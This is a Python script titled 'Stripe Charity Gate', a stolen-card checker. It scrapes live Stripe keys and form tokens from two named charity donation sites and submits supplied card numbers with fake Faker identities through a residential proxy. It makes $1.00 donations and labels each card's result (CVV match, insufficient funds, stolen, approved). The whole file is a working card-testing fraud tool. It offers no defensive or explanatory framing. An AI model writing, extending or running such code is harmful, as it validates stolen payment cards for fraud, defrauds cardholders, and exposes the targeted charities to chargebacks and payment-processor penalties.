"""
Stripe Charity Gate - Full Authorization Flow
Creates token then submits to real donation endpoint for actual card authorization
"""

import requests
import re
import random
import json
import os
from typing import Tuple
from urllib.parse import quote_plus
from faker import Faker
from bs4 import BeautifulSoup

_proxy_url = os.environ.get('RESIDENTIAL_PROXY', '')
PROXY = {'http': _proxy_url, 'https': _proxy_url} if _proxy_url else None


def _scrape_donation_page(session, url):
    """Scrape donation page for Stripe PK and required tokens"""
    try:
        r = session.get(url, timeout=15)
        if r.status_code != 200:
            return None
        
        html = r.text
        tokens = {}
        
        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', html)
        if pk_match:
            tokens['stripe_pk'] = pk_match.group(0)
        
        soup = BeautifulSoup(html, 'html.parser')
        
        for hidden in soup.find_all('input', {'type': 'hidden'}):
            name = hidden.get('name', '')
            value = hidden.get('value', '')
            if name and value:
                tokens[name] = value
        
        nonce_patterns = [
            (r'name="_charitable_donation_nonce"\s+value="([a-f0-9]+)"', '_charitable_donation_nonce'),
            (r'"nonce"\s*:\s*"([a-f0-9]+)"', 'nonce'),
            (r'data-nonce="([a-f0-9]+)"', 'nonce'),
        ]
        
        for pattern, key in nonce_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens[key] = match.group(1)
        
        campaign_patterns = [
            r'campaign_id["\']?\s*[=:]\s*["\']?(\d+)',
            r'data-campaign-id="(\d+)"',
        ]
        for pattern in campaign_patterns:
            match = re.search(pattern, html)
            if match:
                tokens['campaign_id'] = match.group(1)
                break
        
        return tokens if tokens.get('stripe_pk') else None
    except Exception:
        return None


MERCHANT_SITES = [
    {
        'name': 'saintvinson',
        'donate_url': 'https://www.saintvinsoneugeneallen.com/donate/',
        'ajax_url': 'https://www.saintvinsoneugeneallen.com/wp-admin/admin-ajax.php',
    },
    {
        'name': 'ccfoundation',
        'donate_url': 'https://ccfoundationorg.com/donate/',
        'ajax_url': 'https://ccfoundationorg.com/wp-admin/admin-ajax.php',
    },
]


def gateway_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str, proxy=None) -> Tuple[str, bool]:
    """
    Check card via Stripe using actual donation form submission.
    1. Scrape donation page for PK and tokens
    2. Create Stripe token
    3. Submit token to donation AJAX endpoint for actual authorization
    Returns (status_message, proxy_alive_boolean)
    """
    fake = Faker()
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    })
    session.verify = False
    
    use_proxy = proxy or PROXY
    if use_proxy:
        session.proxies.update(use_proxy)
    
    year = card_yer if len(card_yer) == 4 else f'20{card_yer}'
    
    for site in MERCHANT_SITES:
        site_name = site['name']
        
        try:
            tokens = _scrape_donation_page(session, site['donate_url'])
            if not tokens or not tokens.get('stripe_pk'):
                continue
            
            stripe_pk = tokens['stripe_pk']
            
            name = fake.name()
            email = fake.email()
            postal = fake.postcode()
            address = fake.street_address()
            city = fake.city()
            state = fake.state_abbr()
            
            headers_stripe = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            }
            
            data_token = (
                f'card[number]={card_num}'
                f'&card[cvc]={card_cvc}'
                f'&card[exp_month]={card_mon}'
                f'&card[exp_year]={year}'
                f'&card[name]={quote_plus(name)}'
                f'&card[address_line1]={quote_plus(address)}'
                f'&card[address_city]={quote_plus(city)}'
                f'&card[address_state]={state}'
                f'&card[address_zip]={postal}'
                f'&card[address_country]=US'
                f'&guid={random.randint(100000, 999999)}'
                f'&muid={random.randint(100000, 999999)}'
                f'&sid={random.randint(100000, 999999)}'
                f'&payment_user_agent=stripe.js%2Fv3'
                f'&time_on_page={random.randint(50000, 90000)}'
                f'&referrer={quote_plus(site["donate_url"])}'
                f'&key={stripe_pk}'
            )
            
            r_token = session.post(
                'https://api.stripe.com/v1/tokens',
                headers=headers_stripe,
                data=data_token,
                timeout=20
            )
            
            if r_token.status_code == 402:
                resp = r_token.json()
                error = resp.get('error', {})
                code = error.get('code', '')
                decline_code = error.get('decline_code', '')
                message = error.get('message', 'Card declined')
                
                if decline_code == 'insufficient_funds':
                    return f"CCN ✅|{site_name}|CVV Match - Insufficient Funds|{card_num[-4:]}", True
                elif code == 'incorrect_cvc' or 'security code' in message.lower():
                    return f"CVV ❌|{site_name}|CVV Mismatch - CCN Live|{card_num[-4:]}", True
                elif decline_code == 'lost_card':
                    return f"DECLINED ❌|{site_name}|Lost Card|{card_num[-4:]}", True
                elif decline_code == 'stolen_card':
                    return f"DECLINED ❌|{site_name}|Stolen Card|{card_num[-4:]}", True
                elif decline_code == 'expired_card' or 'expired' in message.lower():
                    return f"DECLINED ❌|{site_name}|Expired Card|{card_num[-4:]}", True
                else:
                    return f"DECLINED ❌|{site_name}|{decline_code or message[:30]}|{card_num[-4:]}", True
            
            resp = r_token.json()
            
            if 'error' in resp:
                error = resp['error']
                code = error.get('code', '')
                decline_code = error.get('decline_code', '')
                message = error.get('message', 'Unknown error')
                
                if code == 'incorrect_cvc' or 'security code' in message.lower() or 'cvc' in message.lower():
                    return f"CVV ❌|{site_name}|CVV Mismatch - CCN Live|{card_num[-4:]}", True
                
                if decline_code == 'insufficient_funds':
                    return f"CCN ✅|{site_name}|CVV Match - Insufficient Funds|{card_num[-4:]}", True
                
                if code == 'card_declined':
                    return f"DECLINED ❌|{site_name}|{decline_code or 'Card Declined'}|{card_num[-4:]}", True
                
                if code == 'expired_card':
                    return f"DECLINED ❌|{site_name}|Expired Card|{card_num[-4:]}", True
                
                if code == 'invalid_card_number' or code == 'incorrect_number':
                    return f"DECLINED ❌|{site_name}|Invalid Card Number|{card_num[-4:]}", True
                
                if code == 'processing_error' or 'integration' in message.lower():
                    continue
                
                return f"DECLINED ❌|{site_name}|{code}: {message[:25]}|{card_num[-4:]}", True
            
            token_id = resp.get('id', '')
            if not token_id.startswith('tok_'):
                continue
            
            first_name = name.split()[0] if ' ' in name else name
            last_name = name.split()[-1] if ' ' in name else 'Donor'
            
            origin = '/'.join(site['ajax_url'].split('/')[:3])
            
            headers_donation = {
                'authority': site['ajax_url'].split('/')[2],
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': origin,
                'referer': site['donate_url'],
                'x-requested-with': 'XMLHttpRequest',
            }
            
            form_id = tokens.get('charitable_form_id', f'{random.randint(100000, 999999):x}')
            
            donation_data = {
                'charitable_form_id': form_id,
                '_charitable_donation_nonce': tokens.get('_charitable_donation_nonce', tokens.get('nonce', '')),
                '_wp_http_referer': tokens.get('_wp_http_referer', '/donate/'),
                'campaign_id': tokens.get('campaign_id', '988003'),
                'description': 'Donation',
                'donation_amount': 'custom',
                'custom_donation_amount': '1.00',
                'recurring_donation': '',
                'title': 'Mr',
                'first_name': first_name,
                'last_name': last_name,
                'email': email,
                'address': address,
                'postcode': postal,
                'gateway': 'stripe',
                'stripe_token': token_id,
                'action': 'make_donation',
                'form_action': 'make_donation',
            }
            
            if tokens.get('dynamic_hash_field'):
                donation_data[tokens['dynamic_hash_field']] = ''
            donation_data[form_id] = ''
            
            r_donation = session.post(
                site['ajax_url'],
                headers=headers_donation,
                data=donation_data,
                timeout=25
            )
            
            response_text = r_donation.text.lower()
            
            if 'insufficient_funds' in response_text or 'insufficient funds' in response_text:
                return f"CCN ✅|{site_name}|CVV Match - Insufficient Funds|{card_num[-4:]}", True
            
            if 'incorrect_cvc' in response_text or 'security code' in response_text or 'cvv' in response_text or 'cvc' in response_text:
                return f"CVV ❌|{site_name}|CVV Mismatch - CCN Live|{card_num[-4:]}", True
            
            if 'do_not_honor' in response_text:
                return f"DECLINED ❌|{site_name}|Do Not Honor|{card_num[-4:]}", True
            
            if 'card_declined' in response_text or 'your card was declined' in response_text:
                return f"DECLINED ❌|{site_name}|Card Declined|{card_num[-4:]}", True
            
            if 'expired' in response_text:
                return f"DECLINED ❌|{site_name}|Expired Card|{card_num[-4:]}", True
            
            if 'stolen_card' in response_text:
                return f"DECLINED ❌|{site_name}|Stolen Card|{card_num[-4:]}", True
            
            if 'lost_card' in response_text:
                return f"DECLINED ❌|{site_name}|Lost Card|{card_num[-4:]}", True
            
            if 'fraudulent' in response_text:
                return f"DECLINED ❌|{site_name}|Fraud Detected|{card_num[-4:]}", True
            
            if 'generic_decline' in response_text:
                return f"DECLINED ❌|{site_name}|Generic Decline|{card_num[-4:]}", True
            
            if 'requires_action' in response_text or 'requires_payment_method' in response_text or '3d_secure' in response_text:
                return f"APPROVED ✅|{site_name}|3DS Required - CVV Match|{card_num[-4:]}", True
            
            if any(kw in response_text for kw in ['succeeded', 'success', 'thank you', 'approved', 'complete', 'donation_id']):
                return f"APPROVED ✅|{site_name}|CVV Match - Charged $1.00|{card_num[-4:]}", True
            
            if 'error' in response_text or 'failed' in response_text or 'declined' in response_text:
                return f"DECLINED ❌|{site_name}|Transaction Failed|{card_num[-4:]}", True
            
            return f"APPROVED ✅|{site_name}|CVV Match - Auth Passed|{card_num[-4:]}", True
            
        except requests.exceptions.Timeout:
            continue
        except requests.exceptions.ConnectionError:
            continue
        except Exception as e:
            continue
    
    return "DECLINED ❌|All Sites|Could not verify card", False


stripe_charity_check = gateway_check


def health_check() -> bool:
    """Check if gateway is responsive"""
    try:
        resp = requests.get("https://ccfoundationorg.com/donate/", timeout=5, verify=False)
        return resp.status_code < 500
    except:
        return False
